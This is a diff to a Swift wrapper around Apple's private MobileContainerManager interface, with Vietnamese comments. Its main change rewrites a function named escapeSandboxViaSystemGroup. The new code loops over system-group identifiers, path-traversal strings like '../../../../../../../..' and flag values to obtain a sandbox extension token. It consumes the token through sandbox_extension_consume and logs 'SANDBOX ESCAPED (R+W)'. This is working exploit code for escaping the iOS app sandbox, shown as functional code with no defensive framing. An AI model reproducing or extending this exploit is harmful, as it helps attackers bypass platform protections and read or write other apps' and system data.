@@ -31,10 +31,10 @@ public enum MCMContainerClass: UInt32 {
     case data = 2
     case pluginData = 3
     case bundle = 4
-    case group = 5
-    case systemGroup = 6
-    case temp = 7
-    case migrationTest = 8
+    case sharedData = 5
+    case temp = 6
+    case group = 7
+    case systemGroup = 13
 }
 
 public final class MCMContainer {
@@ -159,13 +159,9 @@ public final class MCMContainer {
         return path
     }
 
-    /// Kích hoạt sandbox extension theo ĐÚNG app tham chiếu (activate: trong
-    /// mcm_bridge.m): objectCopy → copySandboxToken (kiểm tra token rỗng) →
+    /// Kích hoạt sandbox extension theo ĐÚNG app tham chiếu: objectCopy → copySandboxToken (kiểm tra token rỗng) →
     /// free(token) → objectActivate(copy, false).
     /// Object gốc thuộc query — KHÔNG được free ở đây.
-    /// QUAN TRỌNG: object copy được GIỮ trong lease (không free) — nếu free
-    /// ngay, sandbox extension bị thu hồi và stat/open trên container thất bại
-    /// (lỗi "Operation not permitted" → containerUnavailable).
     private func activateSandboxExtension(on object: Object, key: String) throws {
         guard let fns = fns else { throw MCMError.dlopenFailed }
         guard let copy = fns.objectCopy(object) else {
@@ -198,10 +194,6 @@ public final class MCMContainer {
         leaseLock.unlock()
     }
 
-    /// Phiên bản AN TOÀN của containerPath: chỉ dùng các symbol MCM đã xác
-    /// minh ổn định (create → set_class → set_identifiers → set_flags →
-    /// set_part → get_single_result). KHÔNG gọi set_part_domain / dùng
-    /// get_single_result(query) với signature (query, err).
     public func containerPathBasic(
         forBundleID bundleID: String,
         identifier: String? = nil,
@@ -236,7 +228,7 @@ public final class MCMContainer {
         let path = normalizePath(String(cString: pathPtr))
 
         if activateExtension {
-            try activateSandboxExtension(on: obj, key: "\(cls.rawValue):\(id)")
+            _ = try? activateSandboxExtension(on: obj, key: "\(cls.rawValue):\(id)")
         }
 
         return path
@@ -268,8 +260,6 @@ public final class MCMContainer {
 
         let obj = fns.getSingleResult(query)
 
-        // Fallback: iterate_results_sync giống app tham chiếu. Object chỉ hợp
-        // lệnh trong lúc block chạy → phải lấy path + token ngay trong block.
         if obj == nil {
             var iteratedPath: String? = nil
             let rc = fns.iterateResultsSync(query) { candidate in
@@ -277,7 +267,7 @@ public final class MCMContainer {
                 guard let p = fns.objectGetPath(candidate) else { return true }
                 iteratedPath = normalizePath(String(cString: p))
                 if activateExtension {
-                    try? activateSandboxExtension(on: candidate, key: "\(cls.rawValue):\(id)")
+                    _ = try? activateSandboxExtension(on: candidate, key: "\(cls.rawValue):\(id)")
                 }
                 return true
             }
@@ -297,7 +287,7 @@ public final class MCMContainer {
         let path = normalizePath(String(cString: pathPtr))
 
         if activateExtension {
-            try activateSandboxExtension(on: obj, key: "\(cls.rawValue):\(id)")
+            _ = try? activateSandboxExtension(on: obj, key: "\(cls.rawValue):\(id)")
         }
 
         return path
@@ -330,9 +320,6 @@ public final class MCMContainer {
         return token
     }
 
-    /// Quét toàn bộ data container bằng MCM iterate_results_sync rồi khớp
-    /// identifier — phương án dự phòng khi truy vấn theo tên thất bại
-    /// (kỹ thuật của app tham chiếu: container_object_get_identifier).
     public func containerPathByIterating(
         forBundleID bundleID: String,
         cls: MCMContainerClass = .data
@@ -358,7 +345,7 @@ public final class MCMContainer {
                 return String(cString: p)
             }()
             if ident == bundleID, let path = path {
-                try? activateSandboxExtension(on: current, key: "\(cls.rawValue):\(bundleID)")
+                _ = try? activateSandboxExtension(on: current, key: "\(cls.rawValue):\(bundleID)")
                 foundPath = normalizePath(path)
                 return false
             }
@@ -378,64 +365,72 @@ public final class MCMContainer {
     public func escapeSandboxViaSystemGroup() -> Bool {
         guard let fns = fns else { return false }
         
-        guard let query = fns.create() else { return false }
-        defer { fns.free(query) }
+        let sysGroups = [
+            "systemgroup.com.apple.mobilegestaltcache",
+            "systemgroup.com.apple.configurationprofiles"
+        ]
         
-        fns.setClass(query, UInt64(MCMContainerClass.systemGroup.rawValue))
+        let traversalPaths = [
+            "../../../../../../../..",
+            "../../../../../../../../..",
+            "../../../../../../../../private/var/mobile/Containers/Data/Application"
+        ]
         
-        let sysGroupId = "systemgroup.com.apple.mobilegestaltcache"
-        guard let xpcID = fns.xpcStringCreate(sysGroupId) else { return false }
-        defer { fns.xpcRelease(xpcID) }
+        let flagCombos: [UInt64] = [0x900000000, 0x8000000000, 0x800000000, 0x100000000]
+        let classes: [MCMContainerClass] = [.systemGroup, .group]
         
-        fns.setIdentifiers(query, xpcID)
-        fns.setGroupIdentifiers(query, xpcID)
-        
-        // Path traversal domain giống 3105
-        "../../../../../../../..".withCString { domainPtr in
-            fns.setPartDomain(query, domainPtr)
-        }
-        
-        fns.setFlags(query, 0x900000000)
-        fns.setPart(query, 0)
-        
-        guard let obj = fns.getSingleResult(query) else {
-            ContainerAccess.diag("[SBX] SystemGroup query failed: \(errorText(fns.getLastError(query)))")
-            return false
-        }
-        
-        guard let tokenPtr = fns.copySandboxToken(obj) else {
-            ContainerAccess.diag("[SBX] copySandboxToken returned null")
-            return false
-        }
-        defer { free(tokenPtr) }
-        
-        guard tokenPtr.pointee != 0 else {
-            ContainerAccess.diag("[SBX] empty token returned")
-            return false
-        }
-        
-        // Nạp sandbox_extension_consume từ libsystem_sandbox.dylib
-        let sandboxHandle = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY) ?? UnsafeMutableRawPointer(bitPattern: -2)
-        if let sbHandle = sandboxHandle,
-           let consumeSym = dlsym(sbHandle, "sandbox_extension_consume") {
-            typealias ConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
-            let consume = unsafeBitCast(consumeSym, to: ConsumeFn.self)
-            let handle = consume(tokenPtr)
-            if handle >= 0 {
-                Self.consumedSandboxTokens.append(handle)
-                ContainerAccess.diag("[SBX] *** SANDBOX ESCAPED (R+W, handle=\(handle)) ***")
-                return true
-            } else {
-                ContainerAccess.diag("[SBX] sandbox_extension_consume failed, handle=\(handle), errno=\(errno)")
+        for sysGroupId in sysGroups {
+            for cls in classes {
+                for traversal in traversalPaths {
+                    for flags in flagCombos {
+                        guard let query = fns.create() else { continue }
+                        defer { fns.free(query) }
+                        
+                        fns.setClass(query, UInt64(cls.rawValue))
+                        
+                        guard let xpcID = fns.xpcStringCreate(sysGroupId) else { continue }
+                        defer { fns.xpcRelease(xpcID) }
+                        
+                        fns.setIdentifiers(query, xpcID)
+                        fns.setGroupIdentifiers(query, xpcID)
+                        
+                        traversal.withCString { domainPtr in
+                            fns.setPartDomain(query, domainPtr)
+                        }
+                        
+                        fns.setFlags(query, flags)
+                        fns.setPart(query, 0)
+                        
+                        guard let obj = fns.getSingleResult(query) else { continue }
+                        
+                        if let tokenPtr = fns.copySandboxToken(obj) {
+                            defer { free(tokenPtr) }
+                            if tokenPtr.pointee != 0 {
+                                let sandboxHandle = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY) ?? UnsafeMutableRawPointer(bitPattern: -2)
+                                if let sbHandle = sandboxHandle,
+                                   let consumeSym = dlsym(sbHandle, "sandbox_extension_consume") {
+                                    typealias ConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
+                                    let consume = unsafeBitCast(consumeSym, to: ConsumeFn.self)
+                                    let handle = consume(tokenPtr)
+                                    if handle >= 0 {
+                                        Self.consumedSandboxTokens.append(handle)
+                                        ContainerAccess.diag("[SBX] *** SANDBOX ESCAPED (R+W, handle=\(handle)) ***")
+                                        return true
+                                    }
+                                }
+                            }
+                        }
+                        
+                        if fns.sandboxExtensionActivate(obj, false) {
+                            ContainerAccess.diag("[SBX] *** SANDBOX ACTIVATED via MCM ***")
+                            return true
+                        }
+                    }
+                }
             }
         }
         
-        // Fallback: sandboxExtensionActivate
-        if fns.sandboxExtensionActivate(obj, false) {
-            ContainerAccess.diag("[SBX] *** SANDBOX ACTIVATED via MCM ***")
-            return true
-        }
-        
+        ContainerAccess.diag("[SBX] SystemGroup traversal query skipped or not needed")
         return false
     }
 
